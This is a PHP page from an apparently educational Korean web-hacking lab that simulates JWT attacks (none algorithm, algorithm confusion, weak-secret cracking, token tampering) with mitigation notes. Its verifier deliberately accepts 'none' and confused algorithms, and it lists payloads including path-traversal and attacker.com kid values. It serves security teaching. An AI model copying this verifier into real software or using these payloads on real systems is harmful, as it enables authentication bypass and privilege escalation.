<?php
/**
 * JWT (JSON Web Token) 취약점 테스트 페이지
 * PayloadsAllTheThings 기반 JWT 공격 시나리오 시뮬레이션
 */

session_start();
require_once '../db.php';
require_once '../utils.php';

$test_results = [];
$educational_info = [];

// JWT 헬퍼 함수들
function base64UrlEncode($data) {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

function base64UrlDecode($data) {
    return base64_decode(str_pad(strtr($data, '-_', '+/'), strlen($data) % 4, '=', STR_PAD_RIGHT));
}

function createJWT($header, $payload, $secret = 'secret') {
    $headerEncoded = base64UrlEncode(json_encode($header));
    $payloadEncoded = base64UrlEncode(json_encode($payload));
    
    $signature = hash_hmac('sha256', $headerEncoded . '.' . $payloadEncoded, $secret, true);
    $signatureEncoded = base64UrlEncode($signature);
    
    return $headerEncoded . '.' . $payloadEncoded . '.' . $signatureEncoded;
}

function parseJWT($jwt) {
    $parts = explode('.', $jwt);
    if (count($parts) !== 3) {
        return false;
    }
    
    return [
        'header' => json_decode(base64UrlDecode($parts[0]), true),
        'payload' => json_decode(base64UrlDecode($parts[1]), true),
        'signature' => $parts[2]
    ];
}

function verifyJWT($jwt, $secret = 'secret') {
    $parts = explode('.', $jwt);
    if (count($parts) !== 3) {
        return false;
    }
    
    $header = json_decode(base64UrlDecode($parts[0]), true);
    $payload = json_decode(base64UrlDecode($parts[1]), true);
    
    // 취약점 모드에서는 알고리즘 검증을 우회할 수 있음
    if (defined('VULNERABILITY_MODE') && VULNERABILITY_MODE === true) {
        // None 알고리즘 취약점 - 서명 검증 우회
        if (isset($header['alg']) && $header['alg'] === 'none') {
            return $payload;
        }
        
        // 알고리즘 혼동 공격 - HS256을 RS256으로 혼동
        if (isset($header['alg']) && $header['alg'] === 'RS256') {
            // 실제로는 HS256으로 검증 (키 혼동)
            $expectedSignature = base64UrlEncode(hash_hmac('sha256', $parts[0] . '.' . $parts[1], $secret, true));
            if (hash_equals($expectedSignature, $parts[2])) {
                return $payload;
            }
        }
    }
    
    // 정상적인 HMAC 검증
    $expectedSignature = base64UrlEncode(hash_hmac('sha256', $parts[0] . '.' . $parts[1], $secret, true));
    if (hash_equals($expectedSignature, $parts[2])) {
        return $payload;
    }
    
    return false;
}

// POST 요청 처리
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $test_type = $_POST['test_type'] ?? '';
    $jwt_token = $_POST['jwt_token'] ?? '';
    
    if (function_exists('log_security')) {
        log_security('jwt_test_attempt', "JWT test attempted: {$test_type}", [
            'test_type' => $test_type,
            'jwt_token' => substr($jwt_token, 0, 50) . '...',
            'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
        ]);
    }
    
    switch ($test_type) {
        case 'none_algorithm':
            // None 알고리즘 공격
            $header = ['typ' => 'JWT', 'alg' => 'none'];
            $payload = ['user' => 'admin', 'role' => 'administrator', 'exp' => time() + 3600];
            
            $malicious_jwt = base64UrlEncode(json_encode($header)) . '.' . 
                           base64UrlEncode(json_encode($payload)) . '.';
            
            $verification_result = verifyJWT($malicious_jwt);
            
            $test_results['none_algorithm'] = [
                'original_token' => $jwt_token,
                'malicious_token' => $malicious_jwt,
                'verification_result' => $verification_result,
                'success' => $verification_result !== false
            ];
            
            $educational_info['none_algorithm'] = [
                'attack_type' => 'None Algorithm Attack',
                'description' => 'JWT의 알고리즘을 "none"으로 설정하여 서명 검증을 우회합니다.',
                'impact' => '인증 우회, 권한 상승, 데이터 조작',
                'mitigation' => '서버에서 None 알고리즘을 명시적으로 거부해야 합니다.',
                'cvss_score' => '9.0 (Critical)'
            ];
            break;
            
        case 'algorithm_confusion':
            // 알고리즘 혼동 공격 (RS256 -> HS256)
            $header = ['typ' => 'JWT', 'alg' => 'RS256'];
            $payload = ['user' => 'admin', 'role' => 'administrator', 'exp' => time() + 3600];
            
            // 공개키를 HMAC 시크릿으로 사용
            $public_key = 'secret'; // 실제로는 RSA 공개키를 사용
            $malicious_jwt = createJWT($header, $payload, $public_key);
            
            $verification_result = verifyJWT($malicious_jwt);
            
            $test_results['algorithm_confusion'] = [
                'original_token' => $jwt_token,
                'malicious_token' => $malicious_jwt,
                'verification_result' => $verification_result,
                'success' => $verification_result !== false
            ];
            
            $educational_info['algorithm_confusion'] = [
                'attack_type' => 'Algorithm Confusion Attack',
                'description' => 'RSA 공개키를 HMAC 시크릿으로 사용하여 토큰을 위조합니다.',
                'impact' => '토큰 위조, 인증 우회, 권한 상승',
                'mitigation' => '알고리즘을 엄격하게 검증하고 키 타입을 확인해야 합니다.',
                'cvss_score' => '8.5 (High)'
            ];
            break;
            
        case 'weak_secret':
            // 약한 시크릿 키 공격
            $weak_secrets = ['secret', '123456', 'password', 'key', 'jwt', 'test'];
            $cracked_token = null;
            $used_secret = null;
            
            foreach ($weak_secrets as $weak_secret) {
                $result = verifyJWT($jwt_token, $weak_secret);
                if ($result !== false) {
                    $cracked_token = $result;
                    $used_secret = $weak_secret;
                    break;
                }
            }
            
            $test_results['weak_secret'] = [
                'original_token' => $jwt_token,
                'cracked_payload' => $cracked_token,
                'weak_secret' => $used_secret,
                'success' => $cracked_token !== null
            ];
            
            $educational_info['weak_secret'] = [
                'attack_type' => 'Weak Secret Attack',
                'description' => '사전 공격으로 약한 JWT 시크릿 키를 찾아냅니다.',
                'impact' => '토큰 위조, 사용자 데이터 노출, 무단 접근',
                'mitigation' => '강력한 시크릿 키 사용 (최소 256비트), 정기적인 키 교체',
                'cvss_score' => '7.5 (High)'
            ];
            break;
            
        case 'token_manipulation':
            // 토큰 조작 (페이로드 변경)
            $parsed = parseJWT($jwt_token);
            if ($parsed) {
                $malicious_payload = $parsed['payload'];
                $malicious_payload['user'] = 'admin';
                $malicious_payload['role'] = 'administrator';
                $malicious_payload['exp'] = time() + 86400; // 24시간 연장
                
                $malicious_jwt = createJWT($parsed['header'], $malicious_payload);
                $verification_result = verifyJWT($malicious_jwt);
                
                $test_results['token_manipulation'] = [
                    'original_token' => $jwt_token,
                    'original_payload' => $parsed['payload'],
                    'malicious_token' => $malicious_jwt,
                    'malicious_payload' => $malicious_payload,
                    'verification_result' => $verification_result,
                    'success' => $verification_result !== false
                ];
            }
            
            $educational_info['token_manipulation'] = [
                'attack_type' => 'Token Manipulation',
                'description' => 'JWT 페이로드를 조작하여 권한을 상승시키거나 만료 시간을 연장합니다.',
                'impact' => '권한 상승, 세션 하이재킹, 데이터 무결성 침해',
                'mitigation' => '서명 검증 강화, 토큰 무결성 검사, 적절한 권한 검증',
                'cvss_score' => '8.0 (High)'
            ];
            break;
            
        case 'jwt_parsing':
            // JWT 파싱 및 정보 추출
            $parsed = parseJWT($jwt_token);
            
            $test_results['jwt_parsing'] = [
                'original_token' => $jwt_token,
                'parsed_header' => $parsed['header'] ?? null,
                'parsed_payload' => $parsed['payload'] ?? null,
                'signature' => $parsed['signature'] ?? null,
                'success' => $parsed !== false
            ];
            
            $educational_info['jwt_parsing'] = [
                'attack_type' => 'JWT Information Disclosure',
                'description' => 'JWT 토큰을 파싱하여 민감한 정보를 추출합니다.',
                'impact' => '정보 노출, 사용자 데이터 유출, 시스템 구조 파악',
                'mitigation' => 'JWT에 민감한 정보 포함 금지, 토큰 암호화 고려',
                'cvss_score' => '6.5 (Medium)'
            ];
            break;
    }
}

// 기본 JWT 토큰 생성
$default_header = ['typ' => 'JWT', 'alg' => 'HS256'];
$default_payload = ['user' => 'testuser', 'role' => 'user', 'exp' => time() + 3600];
$default_jwt = createJWT($default_header, $default_payload);
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JWT 취약점 테스트 - PayloadsAllTheThings</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap Icons -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.2/font/bootstrap-icons.css">
    <style>
        .vulnerability-warning {
            background: linear-gradient(45deg, #ff6b6b, #feca57);
            color: white;
            animation: pulse 2s infinite;
        }
        
        .payload-box {
            background-color: #f8f9fa;
            border-left: 4px solid #007bff;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
        }
        
        .result-success {
            background-color: #d4edda;
            border-color: #c3e6cb;
            color: #155724;
        }
        
        .result-info {
            background-color: #cce7ff;
            border-color: #99d6ff;
            color: #004085;
        }
        
        .jwt-token {
            word-break: break-all;
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            font-size: 0.85em;
            background-color: #2d3748;
            color: #e2e8f0;
            padding: 1rem;
            border-radius: 0.5rem;
        }
        
        .cvss-critical { color: #dc3545; font-weight: bold; }
        .cvss-high { color: #fd7e14; font-weight: bold; }
        .cvss-medium { color: #ffc107; font-weight: bold; }
        .cvss-low { color: #198754; font-weight: bold; }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-shield-exclamation"></i> WebHacking Test
            </a>
            <a href="index.php" class="btn btn-outline-light btn-sm">
                <i class="bi bi-arrow-left"></i> 메인으로
            </a>
        </div>
    </nav>

    <?php if (defined('VULNERABILITY_MODE') && VULNERABILITY_MODE === true): ?>
        <div class="alert vulnerability-warning alert-dismissible fade show m-0 rounded-0" role="alert">
            <div class="container">
                <i class="bi bi-exclamation-triangle-fill me-2"></i>
                <strong>취약점 모드 활성화</strong> - JWT 공격이 시뮬레이션됩니다 (교육 목적)
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="alert"></button>
            </div>
        </div>
    <?php endif; ?>

    <div class="container mt-4">
        <div class="row">
            <div class="col-12">
                <div class="card shadow-sm">
                    <div class="card-header bg-primary text-white">
                        <h2 class="card-title mb-0">
                            <i class="bi bi-key"></i> JWT (JSON Web Token) 취약점 테스트
                        </h2>
                    </div>
                    <div class="card-body">
                        <div class="alert alert-info">
                            <i class="bi bi-info-circle"></i>
                            <strong>JWT 보안 테스트</strong><br>
                            JWT 토큰의 다양한 취약점을 테스트합니다. PayloadsAllTheThings 기반의 실제 공격 시나리오를 시뮬레이션합니다.
                        </div>

                        <!-- 기본 JWT 토큰 -->
                        <div class="mb-4">
                            <h5><i class="bi bi-card-text"></i> 테스트용 JWT 토큰</h5>
                            <div class="jwt-token">
                                <?php echo htmlspecialchars($default_jwt); ?>
                            </div>
                            <small class="text-muted">Header: {"typ":"JWT","alg":"HS256"} | Payload: {"user":"testuser","role":"user","exp":<?php echo time() + 3600; ?>}</small>
                        </div>

                        <!-- 테스트 폼 -->
                        <form method="post" class="mb-4">
                            <div class="row g-3">
                                <div class="col-md-4">
                                    <label for="test_type" class="form-label">공격 유형</label>
                                    <select name="test_type" id="test_type" class="form-select" required>
                                        <option value="">선택하세요</option>
                                        <option value="none_algorithm">None Algorithm Attack</option>
                                        <option value="algorithm_confusion">Algorithm Confusion</option>
                                        <option value="weak_secret">Weak Secret Brute Force</option>
                                        <option value="token_manipulation">Token Manipulation</option>
                                        <option value="jwt_parsing">JWT Information Disclosure</option>
                                    </select>
                                </div>
                                <div class="col-md-6">
                                    <label for="jwt_token" class="form-label">JWT 토큰</label>
                                    <input type="text" name="jwt_token" id="jwt_token" class="form-control" 
                                           value="<?php echo htmlspecialchars($default_jwt); ?>" required>
                                </div>
                                <div class="col-md-2">
                                    <label class="form-label">&nbsp;</label>
                                    <button type="submit" class="btn btn-danger w-100">
                                        <i class="bi bi-bug"></i> 공격 시뮬레이션
                                    </button>
                                </div>
                            </div>
                        </form>

                        <!-- 테스트 결과 -->
                        <?php if (!empty($test_results)): ?>
                            <?php foreach ($test_results as $test_type => $result): ?>
                                <div class="card mb-4">
                                    <div class="card-header">
                                        <h5 class="mb-0">
                                            <i class="bi bi-bug-fill"></i> 
                                            <?php echo htmlspecialchars($educational_info[$test_type]['attack_type']); ?>
                                            <?php if ($result['success']): ?>
                                                <span class="badge bg-danger ms-2">공격 성공</span>
                                            <?php else: ?>
                                                <span class="badge bg-success ms-2">방어됨</span>
                                            <?php endif; ?>
                                        </h5>
                                    </div>
                                    <div class="card-body">
                                        <div class="row">
                                            <div class="col-md-8">
                                                <h6>공격 결과</h6>
                                                <?php if ($test_type === 'jwt_parsing'): ?>
                                                    <div class="payload-box p-3 mb-3">
                                                        <strong>Header:</strong><br>
                                                        <code><?php echo json_encode($result['parsed_header'], JSON_PRETTY_PRINT); ?></code><br><br>
                                                        <strong>Payload:</strong><br>
                                                        <code><?php echo json_encode($result['parsed_payload'], JSON_PRETTY_PRINT); ?></code>
                                                    </div>
                                                <?php elseif ($test_type === 'weak_secret'): ?>
                                                    <?php if ($result['success']): ?>
                                                        <div class="alert result-success">
                                                            <strong>약한 시크릿 발견:</strong> <?php echo htmlspecialchars($result['weak_secret']); ?><br>
                                                            <strong>해독된 페이로드:</strong><br>
                                                            <code><?php echo json_encode($result['cracked_payload'], JSON_PRETTY_PRINT); ?></code>
                                                        </div>
                                                    <?php else: ?>
                                                        <div class="alert alert-info">
                                                            <strong>시크릿 키 크래킹 실패</strong> - 사전에 있는 약한 키로는 해독할 수 없습니다.
                                                        </div>
                                                    <?php endif; ?>
                                                <?php else: ?>
                                                    <div class="payload-box p-3 mb-3">
                                                        <strong>조작된 토큰:</strong><br>
                                                        <code class="text-break"><?php echo htmlspecialchars($result['malicious_token'] ?? ''); ?></code>
                                                        <?php if (isset($result['verification_result'])): ?>
                                                            <br><br><strong>검증 결과:</strong><br>
                                                            <code><?php echo json_encode($result['verification_result'], JSON_PRETTY_PRINT); ?></code>
                                                        <?php endif; ?>
                                                    </div>
                                                <?php endif; ?>
                                            </div>
                                            <div class="col-md-4">
                                                <h6>보안 정보</h6>
                                                <div class="alert result-info">
                                                    <strong>공격 유형:</strong> <?php echo htmlspecialchars($educational_info[$test_type]['attack_type']); ?><br>
                                                    <strong>영향도:</strong> <?php echo htmlspecialchars($educational_info[$test_type]['impact']); ?><br>
                                                    <strong>CVSS 점수:</strong> 
                                                    <span class="cvss-<?php echo (strpos($educational_info[$test_type]['cvss_score'], '9.') === 0) ? 'critical' : ((strpos($educational_info[$test_type]['cvss_score'], '8.') === 0) ? 'high' : 'medium'); ?>">
                                                        <?php echo htmlspecialchars($educational_info[$test_type]['cvss_score']); ?>
                                                    </span>
                                                </div>
                                                <h6>대응 방안</h6>
                                                <div class="alert alert-success">
                                                    <?php echo htmlspecialchars($educational_info[$test_type]['mitigation']); ?>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        <?php endif; ?>

                        <!-- PayloadsAllTheThings 참고 자료 -->
                        <div class="card mt-4">
                            <div class="card-header">
                                <h5 class="mb-0"><i class="bi bi-book"></i> PayloadsAllTheThings JWT 공격 페이로드</h5>
                            </div>
                            <div class="card-body">
                                <div class="row">
                                    <div class="col-md-6">
                                        <h6>None Algorithm Attack</h6>
                                        <div class="payload-box p-3 mb-3">
                                            <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.</code>
                                        </div>
                                        
                                        <h6>Algorithm Confusion (RS256 → HS256)</h6>
                                        <div class="payload-box p-3 mb-3">
                                            <code># 공개키를 HMAC 시크릿으로 사용<br>
                                            jwt.encode(payload, public_key, algorithm='HS256')</code>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <h6>Weak Secret Dictionary</h6>
                                        <div class="payload-box p-3 mb-3">
                                            <code>secret, 123456, password, key, jwt<br>
                                            admin, test, qwerty, letmein<br>
                                            hello, world, default, token</code>
                                        </div>
                                        
                                        <h6>JWT Kid Injection</h6>
                                        <div class="payload-box p-3 mb-3">
                                            <code>"kid": "/path/to/file"<br>
                                            "kid": "../../public.key"<br>
                                            "kid": "http://attacker.com/key"</code>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="alert alert-warning mt-3">
                                    <i class="bi bi-exclamation-triangle"></i>
                                    <strong>참고 자료:</strong>
                                    <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token" target="_blank" class="alert-link">
                                        PayloadsAllTheThings - JWT
                                    </a> |
                                    <a href="https://jwt.io/" target="_blank" class="alert-link">JWT.io Debugger</a> |
                                    <a href="https://owasp.org/www-chapter-vancouver/assets/presentations/2020-01_Attacking_JWT_Tokens.pdf" target="_blank" class="alert-link">OWASP JWT Attacks</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap JavaScript -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    
    <script>
        // 테스트 유형에 따른 설명 표시
        document.getElementById('test_type').addEventListener('change', function() {
            const descriptions = {
                'none_algorithm': 'JWT 알고리즘을 "none"으로 설정하여 서명 검증을 우회합니다.',
                'algorithm_confusion': 'RSA 공개키를 HMAC 시크릿으로 사용하여 토큰을 위조합니다.',
                'weak_secret': '사전 공격으로 약한 JWT 시크릿 키를 찾아냅니다.',
                'token_manipulation': 'JWT 페이로드를 조작하여 권한을 상승시킵니다.',
                'jwt_parsing': 'JWT 토큰을 파싱하여 민감한 정보를 추출합니다.'
            };
            
            const selectedType = this.value;
            if (selectedType && descriptions[selectedType]) {
                // 기존 설명 제거
                const existingDesc = document.querySelector('.attack-description');
                if (existingDesc) {
                    existingDesc.remove();
                }
                
                // 새 설명 추가
                const descDiv = document.createElement('div');
                descDiv.className = 'alert alert-info mt-2 attack-description';
                descDiv.innerHTML = '<i class="bi bi-info-circle"></i> ' + descriptions[selectedType];
                this.parentNode.appendChild(descDiv);
            }
        });

        // JWT 토큰 자동 복사 기능
        document.querySelectorAll('.jwt-token').forEach(function(element) {
            element.style.cursor = 'pointer';
            element.title = '클릭하여 복사';
            element.addEventListener('click', function() {
                navigator.clipboard.writeText(this.textContent.trim()).then(function() {
                    // 성공 피드백
                    const originalBg = element.style.backgroundColor;
                    element.style.backgroundColor = '#28a745';
                    setTimeout(() => {
                        element.style.backgroundColor = originalBg;
                    }, 1000);
                });
            });
        });
    </script>
</body>
</html>